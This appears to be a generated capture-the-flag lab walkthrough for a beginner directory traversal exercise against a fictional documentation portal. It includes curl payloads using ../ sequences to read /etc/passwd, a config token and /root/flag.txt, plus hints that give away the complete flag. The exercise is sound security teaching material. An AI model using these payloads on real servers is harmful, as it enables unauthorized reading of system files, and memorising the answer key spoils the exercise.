# Pinnacle Cloud - Directory Traversal

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `web-1-7-directory-traversal/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Pinnacle Cloud - Directory Traversal** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **35 minutes** · Difficulty: **beginner**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Pinnacle Cloud Services runs a customer documentation portal where clients
can download product guides, API references, and release notes. The portal
was built quickly by a junior developer and went live without a security
review.

Marcus Reed (Engineering Manager) authorized the assessment: "The portal is
simple - just serves static files. I can't imagine there's much risk there.
But our compliance team wants a sign-off before the SOC 2 audit."

The documentation portal is at http://<target>. Two assessment tokens have
been placed on the server - one in the application directory and one that
requires full filesystem traversal to reach.

## Your Objectives

- Identify a file download feature vulnerable to path traversal
- Craft directory traversal payloads using ../ sequences
- Read system files outside the web application root
- Understand the impact of insufficient path validation
- Capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**Web application responds**

```bash
curl -s -o /dev/null -w '%{http_code}' http://<target>/
```

Expected: `200`

**Path traversal reads /etc/passwd**

```bash
curl -s 'http://<target>/download?file=../../../etc/passwd' | grep -c root
```

Expected: `1`

**Extract token 1 from application config**

```bash
curl -s 'http://<target>/download?file=../config/token.conf' | grep -o 'token=[a-z0-9_]*' | sed 's/token=//'
```

Expected: `p4th`

**Extract token 2 from /root/flag.txt**

```bash
curl -s 'http://<target>/download?file=../../../root/flag.txt'
```

Expected: `tr4v3rs3d`

**Verify complete flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{...}`


### Hint ladder

<details><summary>Hint 1 (unlocks after 8 minutes)</summary>

Browse the documentation portal and look at how file downloads work.
Check the URL structure when downloading a document. Is the filename
passed as a parameter? What happens if you modify it?

</details>

<details><summary>Hint 2 (unlocks after 16 minutes)</summary>

The download endpoint uses a "file" parameter like /download?file=guide.pdf.
Try replacing the filename with a traversal sequence: /download?file=../../../etc/passwd
If you can read /etc/passwd, you have path traversal. Now look for the tokens.

</details>

<details><summary>Hint 3 (unlocks after 22 minutes)</summary>

Token 1: /download?file=../config/token.conf
Token 2: /download?file=../../../root/flag.txt
Assemble: OCR{token1_token2}

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Validate and encode input at the server, enforce authorization on every object, and monitor unusual request patterns.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
